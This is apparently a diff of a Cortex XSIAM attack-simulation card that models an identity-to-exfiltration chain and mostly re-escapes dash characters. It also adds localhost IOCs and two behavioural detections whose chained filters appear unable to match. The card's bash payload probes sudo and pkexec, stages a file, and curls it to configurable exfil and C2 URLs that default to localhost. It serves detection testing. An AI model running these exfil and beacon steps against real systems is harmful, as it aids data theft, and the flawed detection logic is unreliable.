@@ -46,9 +46,9 @@
     }
   },
   "identity": {
-    "name": "AI SOC Summarization Accuracy & Latency — 72-Minute Identity-to-Exfil Narrative Reconstruction (T1078 / T1059.001 / T1567.002 / T1041)",
-    "summary": "Compress an identity -> endpoint -> exfil chain into the 72-minute breakout window Unit 42 measured in its fastest cases, then validate that Cortex XSIAM AI (per Cortex product docs, not the post) stitches the multi-plane signals into one incident and summarizes it — naming valid-account initial access, the escalation burst, and the exfil destination (modeled as cloud storage). An F7 test.",
-    "description": "Unit 42's SOC telemetry shows that in the fastest observed cases attackers now move from initial access to confirmed exfiltration in as little as 72 minutes (a 4X year-over-year acceleration); 65% of initial access is identity-driven, and 87% of incidents force investigators to reason across two or more distinct data sources (complex cases up to ten). Sequential, human-paced triage cannot keep up with that breakout speed; Unit 42 attributes the advantage to real-time, AI-driven cross-source correlation (Managed XSIAM). IMPORTANT — source scoping: the Unit 42 post is cited ONLY for those breakout-speed and identity-driven statistics and for AI-driven correlation. The AI narrative-SUMMARIZATION capability this card exercises — Cortex XSIAM AI stitching the correlated signals into ONE machine-generated incident summary that explicitly names the attack phases — is asserted by Cortex XSIAM product documentation (SRC-PANW-TECHDOCS), NOT by the post, which makes no such claim. This card exercises that F7 KPI end to end. It compresses the signature Muddled Libra (Scattered Spider) identity-driven playbook into a single run: (1) a valid service-account is reused from an anomalous endpoint context (T1078), (2) a scripted-interpreter privilege-escalation burst follows within minutes (T1059.001), and (3) data is staged out and beaconed to an external destination. Second source-scoping note: Unit 42 describes only generic bulk data exfiltration (Spoiled Scorpius moving hundreds of GB within hours); the specific cloud-storage (T1567.002) and C2-channel (T1041) exfil variants modeled here are a POV-engine modeling approximation chosen for a concrete, safe, reproducible run — they are NOT subtechniques the post asserts. No single event is a known-bad IOC; the value proof is that the auto-tuned ABIOCs surface the identity and endpoint deviations, an XQL confirms the egress and that the whole chain fits inside a 4320-second (72-minute) breakout window, and a correlation rule fuses the identity + endpoint + network signals into ONE incident_id. That single incident is what Cortex XSIAM AI narrates (per product docs): the F7 pass condition is that the machine-generated summary is complete and correct — it explicitly names the initial-access phase, the privilege-escalation phase, and the exfiltration destination — AND is produced inside the 72-minute window the intrusion itself took. The DC presents this as proof that Cortex reconstructs a 2-to-10-source narrative in seconds where a sequential SOC would still be pivoting between consoles.",
+    "name": "AI SOC Summarization Accuracy & Latency \u2014 72-Minute Identity-to-Exfil Narrative Reconstruction (T1078 / T1059.001 / T1567.002 / T1041)",
+    "summary": "Compress an identity -> endpoint -> exfil chain into the 72-minute breakout window Unit 42 measured in its fastest cases, then validate that Cortex XSIAM AI (per Cortex product docs, not the post) stitches the multi-plane signals into one incident and summarizes it \u2014 naming valid-account initial access, the escalation burst, and the exfil destination (modeled as cloud storage). An F7 test.",
+    "description": "Unit 42's SOC telemetry shows that in the fastest observed cases attackers now move from initial access to confirmed exfiltration in as little as 72 minutes (a 4X year-over-year acceleration); 65% of initial access is identity-driven, and 87% of incidents force investigators to reason across two or more distinct data sources (complex cases up to ten). Sequential, human-paced triage cannot keep up with that breakout speed; Unit 42 attributes the advantage to real-time, AI-driven cross-source correlation (Managed XSIAM). IMPORTANT \u2014 source scoping: the Unit 42 post is cited ONLY for those breakout-speed and identity-driven statistics and for AI-driven correlation. The AI narrative-SUMMARIZATION capability this card exercises \u2014 Cortex XSIAM AI stitching the correlated signals into ONE machine-generated incident summary that explicitly names the attack phases \u2014 is asserted by Cortex XSIAM product documentation (SRC-PANW-TECHDOCS), NOT by the post, which makes no such claim. This card exercises that F7 KPI end to end. It compresses the signature Muddled Libra (Scattered Spider) identity-driven playbook into a single run: (1) a valid service-account is reused from an anomalous endpoint context (T1078), (2) a scripted-interpreter privilege-escalation burst follows within minutes (T1059.001), and (3) data is staged out and beaconed to an external destination. Second source-scoping note: Unit 42 describes only generic bulk data exfiltration (Spoiled Scorpius moving hundreds of GB within hours); the specific cloud-storage (T1567.002) and C2-channel (T1041) exfil variants modeled here are a POV-engine modeling approximation chosen for a concrete, safe, reproducible run \u2014 they are NOT subtechniques the post asserts. No single event is a known-bad IOC; the value proof is that the auto-tuned ABIOCs surface the identity and endpoint deviations, an XQL confirms the egress and that the whole chain fits inside a 4320-second (72-minute) breakout window, and a correlation rule fuses the identity + endpoint + network signals into ONE incident_id. That single incident is what Cortex XSIAM AI narrates (per product docs): the F7 pass condition is that the machine-generated summary is complete and correct \u2014 it explicitly names the initial-access phase, the privilege-escalation phase, and the exfiltration destination \u2014 AND is produced inside the 72-minute window the intrusion itself took. The DC presents this as proof that Cortex reconstructs a 2-to-10-source narrative in seconds where a sequential SOC would still be pivoting between consoles.",
     "severity": "high",
     "confidence": "high"
   },
@@ -136,7 +136,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "custom-cortex",
-    "framework_reference_id": "SIM-EDR-018 — 72-minute identity-to-exfil chain compressed for Cortex XSIAM AI narrative-summarization (F7) validation",
+    "framework_reference_id": "SIM-EDR-018 \u2014 72-minute identity-to-exfil chain compressed for Cortex XSIAM AI narrative-summarization (F7) validation",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -150,7 +150,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# Safe compression of an identity -> endpoint -> exfil chain into a <72-minute\n# window. No known-bad payloads and no real bulk exfil: a small SAFE-MODE marker\n# file stands in for the 'hundreds of GB' the report describes, sent to an\n# authorised internal staging host, never the public internet.\nset -euo pipefail\n# (1) Initial access — valid service account reused from an interactive context.\nbash -ic 'id; echo \"[CortexSim] EDR-018 valid-account initial access\"' || true\n# (2) Privilege-escalation burst via a scripting interpreter (T1059.001 approximated\n#     on Linux; pwsh when present, else a bash escalation attempt).\nfor c in 'sudo -n true' 'id' 'pkexec --version'; do sh -c \"$c\" >/dev/null 2>&1 || true; done\ncommand -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'Write-Output cortexsim-edr-018-scripted-escalation' >/dev/null 2>&1 || echo '[CortexSim] EDR-018 scripted escalation (bash fallback)'\n# (3) Exfiltration — SAFE-MODE marker to cloud storage (T1567.002) + C2 beacon (T1041).\nhead -c 4096 /dev/zero | tr '\\0' 'A' > /tmp/.cortexsim_edr018_stage\ncurl -s --max-time 5 -T /tmp/.cortexsim_edr018_stage \"${CLOUD_STORAGE_URL:-http://127.0.0.1/cortexsim-exfil}\" >/dev/null 2>&1 || true\ncurl -s --max-time 5 \"${C2_URL:-http://127.0.0.1/beacon}\" -o /dev/null 2>&1 || true",
+      "code": "# Safe compression of an identity -> endpoint -> exfil chain into a <72-minute\n# window. No known-bad payloads and no real bulk exfil: a small SAFE-MODE marker\n# file stands in for the 'hundreds of GB' the report describes, sent to an\n# authorised internal staging host, never the public internet.\nset -euo pipefail\n# (1) Initial access \u2014 valid service account reused from an interactive context.\nbash -ic 'id; echo \"[CortexSim] EDR-018 valid-account initial access\"' || true\n# (2) Privilege-escalation burst via a scripting interpreter (T1059.001 approximated\n#     on Linux; pwsh when present, else a bash escalation attempt).\nfor c in 'sudo -n true' 'id' 'pkexec --version'; do sh -c \"$c\" >/dev/null 2>&1 || true; done\ncommand -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'Write-Output cortexsim-edr-018-scripted-escalation' >/dev/null 2>&1 || echo '[CortexSim] EDR-018 scripted escalation (bash fallback)'\n# (3) Exfiltration \u2014 SAFE-MODE marker to cloud storage (T1567.002) + C2 beacon (T1041).\nhead -c 4096 /dev/zero | tr '\\0' 'A' > /tmp/.cortexsim_edr018_stage\ncurl -s --max-time 5 -T /tmp/.cortexsim_edr018_stage \"${CLOUD_STORAGE_URL:-http://127.0.0.1/cortexsim-exfil}\" >/dev/null 2>&1 || true\ncurl -s --max-time 5 \"${C2_URL:-http://127.0.0.1/beacon}\" -o /dev/null 2>&1 || true",
       "input_variables": [
         {
           "name": "CLOUD_STORAGE_URL",
@@ -185,12 +185,51 @@
     }
   },
   "detections": {
-    "iocs": [],
-    "biocs": [],
+    "iocs": [
+      {
+        "ioc_type": "filename",
+        "value": "/tmp/.cortexsim_edr018_stage",
+        "context": "Temporary file created during exfiltration attempt, used as a marker for safe-mode data staging."
+      },
+      {
+        "ioc_type": "domain",
+        "value": "127.0.0.1",
+        "context": "Staging endpoint for both C2 beacon and cloud storage exfiltration, used in safe-mode simulation."
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "127.0.0.1",
+        "context": "Localhost IP used for C2 beacon and cloud storage endpoint in safe-mode simulation."
+      }
+    ],
+    "biocs": [
+      {
+        "name": "Interactive Shell Under Service Account Context",
+        "description": "Detection of interactive shell processes (bash, pwsh) initiated under a service account context, which is atypical for automated workflows.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_effective_username = \"svc-backup\"\n| filter action_process_image_name in (\"bash\", \"pwsh\")\n| filter action_process_image_name = \"bash\" and action_command_line contains \"-i\"\n| filter action_process_image_name = \"pwsh\" and action_command_line contains \"-Interactive\"",
+        "mitre_technique_ids": [
+          "T1078",
+          "T1059"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      },
+      {
+        "name": "Privilege Escalation via Scripting Interpreter",
+        "description": "Detection of escalation attempts using sudo, pkexec, or PowerShell from a non-privileged context under a service account.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_effective_username = \"svc-backup\"\n| filter action_process_image_name in (\"sudo\", \"pkexec\", \"pwsh\")\n| filter action_command_line contains \"-n\" or action_command_line contains \"--version\"\n| filter action_command_line contains \"Write-Output\" or action_command_line contains \"id\" or action_command_line contains \"true\"",
+        "mitre_technique_ids": [
+          "T1078",
+          "T1059"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
     "abiocs": [
       {
         "name": "AI-SOC-72 Valid-Account Reuse From Anomalous Endpoint Context",
-        "description": "A valid service account whose learned Cortex profile is scheduled, non-interactive automation is driven interactively from an endpoint context that deviates from its baseline — the identity-driven initial-access phase (65% of intrusions per Unit 42). ABIOC anchors the deviation to the causality chain (service-account authentication -> interactive shell) rather than any known-bad binary, so hands-on-keyboard reuse of a legitimate account surfaces as the first signal the AI must name as initial access.",
+        "description": "A valid service account whose learned Cortex profile is scheduled, non-interactive automation is driven interactively from an endpoint context that deviates from its baseline \u2014 the identity-driven initial-access phase (65% of intrusions per Unit 42). ABIOC anchors the deviation to the causality chain (service-account authentication -> interactive shell) rather than any known-bad binary, so hands-on-keyboard reuse of a legitimate account surfaces as the first signal the AI must name as initial access.",
         "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_effective_username in (\"svc-backup\", \"svc-identity\")\n| filter action_process_image_name in (\"bash\", \"sh\", \"zsh\")\n| filter action_process_command_line contains \"sh -i\"\n| filter causality_actor_process_image_name in (\"sshd\", \"su\", \"runuser\", \"sudo\", \"login\", \"systemd\")\n| comp count() as interactive_sessions by agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id\n| filter interactive_sessions >= 1\n| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id, interactive_sessions",
         "severity": "high",
         "mitre_technique_ids": [
@@ -201,14 +240,14 @@
       },
       {
         "name": "AI-SOC-72 Rapid Privilege Escalation After Valid-Account Compromise",
-        "description": "Within minutes of the anomalous valid-account session, the account runs a scripted-interpreter escalation burst (sudo / pkexec / PowerShell-style encoded execution) at a cadence and privilege-seeking shape its learned baseline never exhibits. Every binary is legitimate; the ABIOC fires on the escalation-diversity deviation, anchored to the interactive shell that spawned it — the privilege-escalation phase the AI narrative must name second.",
+        "description": "Within minutes of the anomalous valid-account session, the account runs a scripted-interpreter escalation burst (sudo / pkexec / PowerShell-style encoded execution) at a cadence and privilege-seeking shape its learned baseline never exhibits. Every binary is legitimate; the ABIOC fires on the escalation-diversity deviation, anchored to the interactive shell that spawned it \u2014 the privilege-escalation phase the AI narrative must name second.",
         "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_effective_username in (\"svc-backup\", \"svc-identity\")\n| filter action_process_image_name in (\"sudo\", \"su\", \"pkexec\", \"pwsh\", \"powershell\")\n| filter causality_actor_process_image_name in (\"bash\", \"sh\", \"zsh\", \"sshd\", \"su\", \"runuser\")\n| comp count_distinct(action_process_image_name) as escalation_tools by agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id\n| filter escalation_tools >= 2\n| sort desc escalation_tools\n| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id, escalation_tools",
         "severity": "high",
         "mitre_technique_ids": [
           "T1059.001"
         ],
         "behavioral_profile": "machine-learning",
-        "causality_anchor": "Interactive shell under the compromised valid account (the sshd->shell CGO) -> rapid fan-out of distinct escalation utilities that exceeds the account's learned process diversity, keyed on causality_actor_process_image_name (the spawning shell) + causality_id so the burst is provably a lineage descendant of the same initial-access chain, not an unrelated cluster of elevated processes — the privilege-escalation phase the AI narrative names second."
+        "causality_anchor": "Interactive shell under the compromised valid account (the sshd->shell CGO) -> rapid fan-out of distinct escalation utilities that exceeds the account's learned process diversity, keyed on causality_actor_process_image_name (the spawning shell) + causality_id so the burst is provably a lineage descendant of the same initial-access chain, not an unrelated cluster of elevated processes \u2014 the privilege-escalation phase the AI narrative names second."
       }
     ],
     "xql_queries": [
@@ -236,7 +275,7 @@
     ],
     "analytics_modules": [
       {
-        "module": "Cortex XSIAM AI — cross-source incident narrative summarization",
+        "module": "Cortex XSIAM AI \u2014 cross-source incident narrative summarization",
         "validated": true,
         "note": "CR-EDR-0018 produces the single stitched incident the summarizer narrates; the two ABIOCs plus the exfil XQL are the deployable signals backing it."
       }
@@ -335,26 +374,26 @@
   },
   "references": [
     {
-      "title": "Unit 42 — Inside the Modern SOC: The 72-Minute Race",
+      "title": "Unit 42 \u2014 Inside the Modern SOC: The 72-Minute Race",
       "url": "https://unit42.paloaltonetworks.com/soc-72-minute-race/",
       "publisher": "Unit 42",
       "publisher_id": "SRC-UNIT42",
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1078 — Valid Accounts",
+      "title": "MITRE ATT&CK T1078 \u2014 Valid Accounts",
       "url": "https://attack.mitre.org/techniques/T1078/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
     },
     {
-      "title": "MITRE ATT&CK T1567.002 — Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+      "title": "MITRE ATT&CK T1567.002 \u2014 Exfiltration Over Web Service: Exfiltration to Cloud Storage",
       "url": "https://attack.mitre.org/techniques/T1567/002/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
     },
     {
-      "title": "Cortex XSIAM — Analytics Alert Reference and AI incident summarization",
+      "title": "Cortex XSIAM \u2014 Analytics Alert Reference and AI incident summarization",
       "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Analytics-Alert-Reference",
       "publisher": "Palo Alto Networks TechDocs",
       "publisher_id": "SRC-PANW-TECHDOCS"
